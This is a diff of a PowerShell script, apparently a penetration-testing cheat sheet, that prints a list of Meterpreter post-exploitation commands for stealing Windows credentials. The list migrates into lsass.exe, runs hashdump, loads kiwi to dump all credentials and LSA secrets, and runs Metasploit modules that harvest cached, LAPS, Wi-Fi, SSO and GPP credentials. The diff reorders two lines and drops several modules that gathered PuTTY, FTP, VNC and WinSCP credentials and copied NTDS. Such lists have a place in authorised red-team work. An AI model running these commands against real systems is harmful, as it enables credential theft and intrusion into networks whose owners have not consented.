@@ -19,23 +19,16 @@ Write-Host -ForegroundColor Yellow "CREDS USING METERPRETER:"
 Write-Host -ForegroundColor DarkYellow @'
 migrate -N lsass.exe
 hashdump
-run post/windows/gather/credentials/credential_collector
-run post/windows/gather/smart_hashdump
 load kiwi
 creds_all
 lsa_dump_secrets
+run post/windows/gather/credentials/credential_collector
+run post/windows/gather/smart_hashdump
 run post/windows/gather/cachedump
 run post/windows/gather/credentials/enum_laps
 run post/windows/wlan/wlan_profile
 run post/windows/gather/credentials/sso
 run post/windows/gather/credentials/gpp
-run post/windows/gather/enum_putty_saved_sessions
-run post/windows/gather/credentials/coreftp
-run post/multi/gather/filezilla_client_cred
-run post/windows/gather/credentials/vnc
-run post/windows/gather/credentials/winscp
-run post/windows/gather/ntds_location
-run post/windows/gather/ntds_grabber
 '@
 
 Write-Host -NoNewline -ForegroundColor DarkGreen "`n [REMINDER] ---  ---  ---  ---  --- "
